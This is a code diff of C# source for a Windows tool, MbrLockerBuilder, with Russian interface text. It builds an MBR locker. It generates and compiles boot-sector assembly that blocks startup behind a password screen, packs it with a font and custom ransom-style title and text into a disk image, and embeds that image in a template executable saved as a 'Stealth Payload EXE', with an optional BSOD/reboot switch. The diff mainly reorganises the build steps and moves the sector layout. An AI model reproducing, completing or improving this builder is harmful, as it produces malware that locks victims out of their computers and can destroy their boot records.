@@ -389,222 +389,9 @@ namespace MbrLockerBuilder
             return text.Any(c => (c >= 'А' && c <= 'я') || c == 'Ё' || c == 'ё');
         }
 
-        private void BtnBuild_Click(object sender, EventArgs e)
-        {
-            try
-            {
-                if (ContainsRussian(this.txtPassword.Text))
-                {
-                    DialogResult result = MessageBox.Show(
-                        "⚠️ Пароль содержит русские буквы!\n\n" +
-                        "BIOS не поддерживает русские буквы в пароле.\n" +
-                        "Пользователь не сможет ввести русский пароль.\n\n" +
-                        "Рекомендуется использовать только:\n" +
-                        "- Латинские буквы (A-Z, a-z)\n" +
-                        "- Цифры (0-9)\n" +
-                        "- Спецсимволы (!@#$%^&*)\n\n" +
-                        "Продолжить с текущим паролем?",
-                        "Предупреждение",
-                        MessageBoxButtons.YesNo,
-                        MessageBoxIcon.Warning
-                    );
-                    if (result == DialogResult.No)
-                        return;
-                }
-
-                this.lblStatus.Text = "1/7 Поиск ресурсов...";
-                Application.DoEvents();
-
-                string nasmPath = FindResourceByPartialName("nasm", "nasm.exe");
-                if (string.IsNullOrEmpty(nasmPath))
-                {
-                    string localNasm = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "nasm.exe");
-                    if (File.Exists(localNasm))
-                        nasmPath = localNasm;
-                    else
-                        throw new Exception("NASM не найден!");
-                }
-
-                this.lblStatus.Text = "2/7 Компиляция MBR...";
-                Application.DoEvents();
-
-                string mbrAsm = this.GenerateMBR();
-                string mbrPath = Path.Combine(Path.GetTempPath(), "mbr.asm");
-                File.WriteAllText(mbrPath, mbrAsm, Encoding.ASCII);
-
-                string mbrBinPath = Path.Combine(Path.GetTempPath(), "mbr.bin");
-                RunNasm(nasmPath, mbrPath, mbrBinPath);
-                byte[] mbrBytes = File.ReadAllBytes(mbrBinPath);
-                if (mbrBytes.Length != 512)
-                    throw new Exception($"MBR size: {mbrBytes.Length} != 512");
-
-                this.lblStatus.Text = "3/7 Компиляция Stage2...";
-                Application.DoEvents();
-                byte[] stage2Bytes = new byte[0];
-
-                this.lblStatus.Text = "4/7 Сборка образа...";
-                Application.DoEvents();
-
-                // НОВАЯ СТРУКТУРА: 10 секторов (0-9)
-                int totalSectors = 10;
-                byte[] fullImage = new byte[512 * totalSectors];
-
-                // 1. MBR (сектор 0)
-                Array.Copy(mbrBytes, 0, fullImage, 0, 512);
-
-                // 2. Шрифт (сектора 3-4) — 2 сектора = 1024 байта
-                byte[] fontData = GenerateCP866Font();
-                if (fontData != null && fontData.Length >= 1024)
-                {
-                    Array.Copy(fontData, 0, fullImage, 512 * 3, 1024);
-                }
-                else
-                {
-                    MessageBox.Show("Шрифт cp866_font.bin не загружен!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                    return;
-                }
-
-                // 3. Заголовок (сектор 5)
-                string title = this.txtTitle.Text.Trim();
-                if (string.IsNullOrEmpty(title)) title = "LOCKED";
-                string border = "========================================\r\n";
-                string formattedTitle = "     " + title + "     \r\n";
-                string titleText = border + formattedTitle + border + "\r\n\0";
-                byte[] titleBytes = Encoding.GetEncoding(866).GetBytes(titleText);
-                if (titleBytes.Length > 512) Array.Resize(ref titleBytes, 512);
-                Array.Copy(titleBytes, 0, fullImage, 512 * 5, titleBytes.Length);
-
-                // 4. Текст (сектор 6)
-                string body = this.txtBody.Text.Trim();
-                if (string.IsNullOrEmpty(body)) body = "Computer is locked.";
-                string formattedBody = body.Replace("\n", "\r\n");
-                string bodyText = formattedBody + "\0";
-                byte[] bodyBytes = Encoding.GetEncoding(866).GetBytes(bodyText);
-                if (bodyBytes.Length > 512) Array.Resize(ref bodyBytes, 512);
-                Array.Copy(bodyBytes, 0, fullImage, 512 * 6, bodyBytes.Length);
-
-                this.lblStatus.Text = "5/7 Получение template.exe...";
-                Application.DoEvents();
-
-                byte[] templateBytes = FindResourceBytesByPartialName("template");
-                if (templateBytes == null)
-                {
-                    string localTemplate = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "template.exe");
-                    if (File.Exists(localTemplate))
-                        templateBytes = File.ReadAllBytes(localTemplate);
-                    else
-                        throw new Exception("template.exe не найден!");
-                }
-
-                this.lblStatus.Text = "6/7 Встраивание MBR как ресурс...";
-                Application.DoEvents();
-
-                string tempTemplatePath = Path.Combine(Path.GetTempPath(), "template_temp.exe");
-                File.WriteAllBytes(tempTemplatePath, templateBytes);
-
-                string outputPath = Path.Combine(Path.GetTempPath(), "payload_temp.exe");
-                File.Copy(tempTemplatePath, outputPath, true);
-
-                IntPtr hUpdate = BeginUpdateResource(outputPath, false);
-                if (hUpdate == IntPtr.Zero)
-                    throw new Exception("Не удалось открыть файл для обновления ресурсов!");
-
-                if (!UpdateResource(hUpdate, "BINARY", "MBR", 0, fullImage, (uint)fullImage.Length))
-                {
-                    EndUpdateResource(hUpdate, true);
-                    throw new Exception("Не удалось добавить ресурс MBR!");
-                }
-
-                if (this.chkBSOD.Checked)
-                {
-                    byte[] bsodData = new byte[1] { 0x01 };
-                    if (!UpdateResource(hUpdate, "RT_RCDATA", "BSOD", 0, bsodData, 1))
-                    {
-                        EndUpdateResource(hUpdate, true);
-                        throw new Exception("Не удалось добавить ресурс BSOD!");
-                    }
-                }
-
-                if (!EndUpdateResource(hUpdate, false))
-                    throw new Exception("Не удалось сохранить файл!");
-
-                byte[] payloadBytes = File.ReadAllBytes(outputPath);
-
-                try { File.Delete(tempTemplatePath); } catch { }
-                try { File.Delete(outputPath); } catch { }
-
-                this.lblStatus.Text = "7/7 Сохранение...";
-                Application.DoEvents();
-
-                this.saveFileDialog.Title = "Сохранить Stealth Payload EXE";
-                this.saveFileDialog.Filter = "Executable (*.exe)|*.exe";
-                if (this.saveFileDialog.ShowDialog() == DialogResult.OK)
-                {
-                    File.WriteAllBytes(this.saveFileDialog.FileName, payloadBytes);
-                    this.lblStatus.Text = "Готово: " + Path.GetFileName(this.saveFileDialog.FileName);
-                    MessageBox.Show("Mbr locker создан!", "Успех", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                }
-                else
-                {
-                    this.lblStatus.Text = "Отменено";
-                }
-
-                try { File.Delete(mbrPath); } catch { }
-                try { File.Delete(mbrBinPath); } catch { }
-                if (nasmPath.StartsWith(Path.GetTempPath())) { try { File.Delete(nasmPath); } catch { } }
-            }
-            catch (Exception ex)
-            {
-                this.lblStatus.Text = "Ошибка: " + ex.Message;
-                MessageBox.Show("Ошибка сборки:\n" + ex.Message,
-                    "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            }
-        }
-
-        private void RunNasm(string nasmPath, string asmPath, string binPath)
-        {
-            Process nasm = new Process();
-            nasm.StartInfo.FileName = nasmPath;
-            nasm.StartInfo.Arguments = $"-f bin -o \"{binPath}\" \"{asmPath}\"";
-            nasm.StartInfo.UseShellExecute = false;
-            nasm.StartInfo.RedirectStandardOutput = true;
-            nasm.StartInfo.RedirectStandardError = true;
-            nasm.StartInfo.CreateNoWindow = true;
-            nasm.Start();
-            nasm.WaitForExit();
-            if (nasm.ExitCode != 0)
-                throw new Exception("NASM Error: " + nasm.StandardError.ReadToEnd());
-        }
-
         private string GenerateMBR()
-{
-    string template = null;
-
-    try
-    {
-        using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.mbr.asm"))
         {
-            if (stream != null)
-            {
-                using (StreamReader reader = new StreamReader(stream))
-                {
-                    template = reader.ReadToEnd();
-                }
-            }
-        }
-    }
-    catch { }
-
-    if (string.IsNullOrEmpty(template))
-    {
-        string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "locker", "mbr.asm");
-        if (File.Exists(localPath))
-            template = File.ReadAllText(localPath);
-    }
-
-    if (string.IsNullOrEmpty(template))
-    {
-        template = @"BITS 16
+            string template = @"BITS 16
 ORG 0x7C00
 
 start:
@@ -627,12 +414,11 @@ start:
     mov dx, 0x184F
     int 0x10
 
-    ; ЗАГРУЗКА ШРИФТА (СЕКТОРА 3-4)
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x1000
     mov ah, 0x02
-    mov al, 2
+    mov al, 8
     mov ch, 0
     mov cl, 3
     mov dh, 0
@@ -644,14 +430,13 @@ start:
     mov bx, 0x0100
     int 0x10
 
-    ; ЗАГРУЗКА ЗАГОЛОВКА (СЕКТОР 5)
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x9000
     mov ah, 0x02
     mov al, 1
     mov ch, 0
-    mov cl, 5
+    mov cl, 11
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -660,14 +445,13 @@ start:
     mov si, 0x9000
     call print
 
-    ; ЗАГРУЗКА ТЕКСТА (СЕКТОР 6)
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x9200
     mov ah, 0x02
     mov al, 1
     mov ch, 0
-    mov cl, 6
+    mov cl, 12
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -690,7 +474,7 @@ password_loop:
     call check_password
     cmp byte [password_ok], 1
     je restore_and_boot
-    
+
     mov si, msg_wrong
     call print
 
@@ -756,7 +540,6 @@ print:
 
 get_password:
     mov di, buffer
-    mov cx, 64
 .loop:
     xor ax, ax
     int 0x16
@@ -772,7 +555,7 @@ get_password:
     mov ah, 0x0E
     mov bh, 0x00
     mov bl, 0x07
-    mov al, [di - 1]    ; ← ОТОБРАЖАЕМ ВВЕДЕННЫЙ СИМВОЛ
+    mov al, [di - 1]
     int 0x10
     jmp .loop
 .backspace:
@@ -807,7 +590,7 @@ check_password:
     lodsb
     or al, al
     jz .check_end
-    cmp al, [di]        ; ← ИСПРАВЛЕННАЯ ВЕРСИЯ (РАБОТАЕТ)
+    cmp al, [di]
     jne .fail
     inc di
     jmp .compare
@@ -838,86 +621,70 @@ buffer:
 password_ok:
     db 0
 
-times 510 - ($ - $$) db 0
+times 510 - ($ - start) db 0
 dw 0xAA55";
-    }
 
-    // ============================================================
-    // ЗАМЕНА ПАРОЛЯ
-    // ============================================================
-    string password = this.txtPassword.Text.Trim();
-    if (string.IsNullOrEmpty(password)) password = "admin";
+            string password = this.txtPassword.Text.Trim();
+            if (string.IsNullOrEmpty(password)) password = "admin";
 
-    string passwordHex;
-    if (ContainsRussian(password))
-    {
-        string cleanPassword = new string(password.Where(c => c < 128).ToArray());
-        if (string.IsNullOrEmpty(cleanPassword)) cleanPassword = "admin";
-        passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(cleanPassword).Select(b => "0x" + b.ToString("X2")));
-    }
-    else
-    {
-        passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(password).Select(b => "0x" + b.ToString("X2")));
-    }
+            string passwordHex;
+            if (ContainsRussian(password))
+            {
+                string cleanPassword = new string(password.Where(c => c < 128).ToArray());
+                if (string.IsNullOrEmpty(cleanPassword)) cleanPassword = "admin";
+                passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(cleanPassword).Select(b => "0x" + b.ToString("X2")));
+            }
+            else
+            {
+                passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(password).Select(b => "0x" + b.ToString("X2")));
+            }
 
-    template = template.Replace("{PASSWORD_HEX}", passwordHex + ", 0x00");
+            template = template.Replace("{PASSWORD_HEX}", passwordHex + ", 0x00");
 
-    // ============================================================
-    // ЗАМЕНА ЦВЕТОВ
-    // ============================================================
-    string textColor = "07";
-    switch (this.cmbTextColor.SelectedIndex)
-    {
-        case 0: textColor = "00"; break;
-        case 1: textColor = "01"; break;
-        case 2: textColor = "02"; break;
-        case 3: textColor = "03"; break;
-        case 4: textColor = "04"; break;
-        case 5: textColor = "05"; break;
-        case 6: textColor = "06"; break;
-        case 7: textColor = "07"; break;
-        case 8: textColor = "08"; break;
-        case 9: textColor = "09"; break;
-        case 10: textColor = "0A"; break;
-        case 11: textColor = "0B"; break;
-        case 12: textColor = "0C"; break;
-        case 13: textColor = "0D"; break;
-        case 14: textColor = "0E"; break;
-        case 15: textColor = "0F"; break;
-    }
+            string textColor = "07";
+            switch (this.cmbTextColor.SelectedIndex)
+            {
+                case 0: textColor = "00"; break;
+                case 1: textColor = "01"; break;
+                case 2: textColor = "02"; break;
+                case 3: textColor = "03"; break;
+                case 4: textColor = "04"; break;
+                case 5: textColor = "05"; break;
+                case 6: textColor = "06"; break;
+                case 7: textColor = "07"; break;
+                case 8: textColor = "08"; break;
+                case 9: textColor = "09"; break;
+                case 10: textColor = "0A"; break;
+                case 11: textColor = "0B"; break;
+                case 12: textColor = "0C"; break;
+                case 13: textColor = "0D"; break;
+                case 14: textColor = "0E"; break;
+                case 15: textColor = "0F"; break;
+            }
 
-    string bgColor = "00";
-    switch (this.cmbBgColor.SelectedIndex)
-    {
-        case 0: bgColor = "00"; break;
-        case 1: bgColor = "10"; break;
-        case 2: bgColor = "20"; break;
-        case 3: bgColor = "30"; break;
-        case 4: bgColor = "40"; break;
-        case 5: bgColor = "50"; break;
-        case 6: bgColor = "60"; break;
-        case 7: bgColor = "70"; break;
-    }
+            string bgColor = "00";
+            switch (this.cmbBgColor.SelectedIndex)
+            {
+                case 0: bgColor = "00"; break;
+                case 1: bgColor = "10"; break;
+                case 2: bgColor = "20"; break;
+                case 3: bgColor = "30"; break;
+                case 4: bgColor = "40"; break;
+                case 5: bgColor = "50"; break;
+                case 6: bgColor = "60"; break;
+                case 7: bgColor = "70"; break;
+            }
 
-    // Заменяем фон
-    template = template.Replace("mov bh, 0x00", "mov bh, 0x" + bgColor);
+            template = template.Replace("mov bh, 0x00", "mov bh, 0x" + bgColor);
+            template = template.Replace("mov bl, 0x07", "mov bl, 0x" + textColor);
 
-    // Заменяем цвет текста
-    template = template.Replace("mov bl, 0x07", "mov bl, 0x" + textColor);
+            bool enableBSOD = this.chkBSOD.Checked;
+            if (enableBSOD)
+            {
+                template = template.Replace("jmp hang", "int 0x19");
+            }
 
-    // BSOD
-    bool enableBSOD = this.chkBSOD.Checked;
-    if (enableBSOD)
-    {
-        template = template.Replace("jmp hang", "int 0x19");
-    }
-
-    return template;
-}
-
-        private string GenerateStage2()
-        {
-            return "";
+            return template;
         }
 
         private string FindResourceByPartialName(string partialName, string fileName)
@@ -999,6 +766,191 @@ dw 0xAA55";
                 this.lblStatus.Text = $"Ошибка: {ex.Message}";
                 return null;
             }
+        }
+
+        private void BtnBuild_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (ContainsRussian(this.txtPassword.Text))
+                {
+                    DialogResult result = MessageBox.Show(
+                        "⚠️ Пароль содержит русские буквы!\n\n" +
+                        "BIOS не поддерживает русские буквы в пароле.\n" +
+                        "Пользователь не сможет ввести русский пароль.\n\n" +
+                        "Рекомендуется использовать только:\n" +
+                        "- Латинские буквы (A-Z, a-z)\n" +
+                        "- Цифры (0-9)\n" +
+                        "- Спецсимволы (!@#$%^&*)\n\n" +
+                        "Продолжить с текущим паролем?",
+                        "Предупреждение",
+                        MessageBoxButtons.YesNo,
+                        MessageBoxIcon.Warning
+                    );
+                    if (result == DialogResult.No)
+                        return;
+                }
+
+                this.lblStatus.Text = "1/7 Поиск ресурсов...";
+                Application.DoEvents();
+
+                string nasmPath = FindResourceByPartialName("nasm", "nasm.exe");
+                if (string.IsNullOrEmpty(nasmPath))
+                {
+                    string localNasm = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "nasm.exe");
+                    if (File.Exists(localNasm))
+                        nasmPath = localNasm;
+                    else
+                        throw new Exception("NASM не найден!");
+                }
+
+                this.lblStatus.Text = "2/7 Компиляция MBR...";
+                Application.DoEvents();
+
+                string mbrAsm = this.GenerateMBR();
+                string mbrPath = Path.Combine(Path.GetTempPath(), "mbr.asm");
+                File.WriteAllText(mbrPath, mbrAsm, Encoding.ASCII);
+
+                string mbrBinPath = Path.Combine(Path.GetTempPath(), "mbr.bin");
+                RunNasm(nasmPath, mbrPath, mbrBinPath);
+                byte[] mbrBytes = File.ReadAllBytes(mbrBinPath);
+                if (mbrBytes.Length != 512)
+                    throw new Exception($"MBR size: {mbrBytes.Length} != 512");
+
+                this.lblStatus.Text = "3/7 Сборка образа...";
+                Application.DoEvents();
+
+                // 13 СЕКТОРОВ (0-12)
+                int totalSectors = 13;
+                byte[] fullImage = new byte[512 * totalSectors];
+
+                // 1. MBR (сектор 0)
+                Array.Copy(mbrBytes, 0, fullImage, 0, 512);
+
+                // 2. Шрифт (сектора 3-10) — 8 секторов = 4096 байт
+                byte[] fontData = GenerateCP866Font();
+                if (fontData != null && fontData.Length >= 4096)
+                {
+                    Array.Copy(fontData, 0, fullImage, 512 * 3, 4096);
+                }
+                else
+                {
+                    byte[] paddedFont = new byte[4096];
+                    if (fontData != null)
+                        Array.Copy(fontData, paddedFont, Math.Min(fontData.Length, 4096));
+                    Array.Copy(paddedFont, 0, fullImage, 512 * 3, 4096);
+                }
+
+                // 3. Заголовок (сектор 11)
+                string title = this.txtTitle.Text.Trim();
+                if (string.IsNullOrEmpty(title)) title = "LOCKED";
+                string border = "========================================\r\n";
+                string formattedTitle = "     " + title + "     \r\n";
+                string titleText = border + formattedTitle + border + "\r\n\0";
+                byte[] titleBytes = Encoding.GetEncoding(866).GetBytes(titleText);
+                if (titleBytes.Length > 512) Array.Resize(ref titleBytes, 512);
+                Array.Copy(titleBytes, 0, fullImage, 512 * 11, titleBytes.Length);
+
+                // 4. Текст (сектор 12)
+                string body = this.txtBody.Text.Trim();
+                if (string.IsNullOrEmpty(body)) body = "Computer is locked.";
+                string formattedBody = body.Replace("\n", "\r\n");
+                string bodyText = formattedBody + "\0";
+                byte[] bodyBytes = Encoding.GetEncoding(866).GetBytes(bodyText);
+                if (bodyBytes.Length > 512) Array.Resize(ref bodyBytes, 512);
+                Array.Copy(bodyBytes, 0, fullImage, 512 * 12, bodyBytes.Length);
+
+                this.lblStatus.Text = "4/7 Получение template.exe...";
+                Application.DoEvents();
+
+                byte[] templateBytes = FindResourceBytesByPartialName("template");
+                if (templateBytes == null)
+                {
+                    string localTemplate = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "template.exe");
+                    if (File.Exists(localTemplate))
+                        templateBytes = File.ReadAllBytes(localTemplate);
+                    else
+                        throw new Exception("template.exe не найден!");
+                }
+
+                this.lblStatus.Text = "5/7 Встраивание MBR как ресурс...";
+                Application.DoEvents();
+
+                string tempTemplatePath = Path.Combine(Path.GetTempPath(), "template_temp.exe");
+                File.WriteAllBytes(tempTemplatePath, templateBytes);
+
+                string outputPath = Path.Combine(Path.GetTempPath(), "payload_temp.exe");
+                File.Copy(tempTemplatePath, outputPath, true);
+
+                IntPtr hUpdate = BeginUpdateResource(outputPath, false);
+                if (hUpdate == IntPtr.Zero)
+                    throw new Exception("Не удалось открыть файл для обновления ресурсов!");
+
+                if (!UpdateResource(hUpdate, "BINARY", "MBR", 0, fullImage, (uint)fullImage.Length))
+                {
+                    EndUpdateResource(hUpdate, true);
+                    throw new Exception("Не удалось добавить ресурс MBR!");
+                }
+
+                if (this.chkBSOD.Checked)
+                {
+                    byte[] bsodData = new byte[1] { 0x01 };
+                    if (!UpdateResource(hUpdate, "RT_RCDATA", "BSOD", 0, bsodData, 1))
+                    {
+                        EndUpdateResource(hUpdate, true);
+                        throw new Exception("Не удалось добавить ресурс BSOD!");
+                    }
+                }
+
+                if (!EndUpdateResource(hUpdate, false))
+                    throw new Exception("Не удалось сохранить файл!");
+
+                byte[] payloadBytes = File.ReadAllBytes(outputPath);
+
+                try { File.Delete(tempTemplatePath); } catch { }
+                try { File.Delete(outputPath); } catch { }
+
+                this.lblStatus.Text = "6/7 Сохранение...";
+                Application.DoEvents();
+
+                this.saveFileDialog.Title = "Сохранить Stealth Payload EXE";
+                this.saveFileDialog.Filter = "Executable (*.exe)|*.exe";
+                if (this.saveFileDialog.ShowDialog() == DialogResult.OK)
+                {
+                    File.WriteAllBytes(this.saveFileDialog.FileName, payloadBytes);
+                    this.lblStatus.Text = "Готово: " + Path.GetFileName(this.saveFileDialog.FileName);
+                    MessageBox.Show("Mbr locker создан!", "Успех", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+                else
+                {
+                    this.lblStatus.Text = "Отменено";
+                }
+
+                try { File.Delete(mbrPath); } catch { }
+                try { File.Delete(mbrBinPath); } catch { }
+                if (nasmPath.StartsWith(Path.GetTempPath())) { try { File.Delete(nasmPath); } catch { } }
+            }
+            catch (Exception ex)
+            {
+                this.lblStatus.Text = "Ошибка: " + ex.Message;
+                MessageBox.Show("Ошибка сборки:\n" + ex.Message,
+                    "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        private void RunNasm(string nasmPath, string asmPath, string binPath)
+        {
+            Process nasm = new Process();
+            nasm.StartInfo.FileName = nasmPath;
+            nasm.StartInfo.Arguments = $"-f bin -o \"{binPath}\" \"{asmPath}\"";
+            nasm.StartInfo.UseShellExecute = false;
+            nasm.StartInfo.RedirectStandardOutput = true;
+            nasm.StartInfo.RedirectStandardError = true;
+            nasm.StartInfo.CreateNoWindow = true;
+            nasm.Start();
+            nasm.WaitForExit();
+            if (nasm.ExitCode != 0)
+                throw new Exception("NASM Error: " + nasm.StandardError.ReadToEnd());
         }
     }
 }
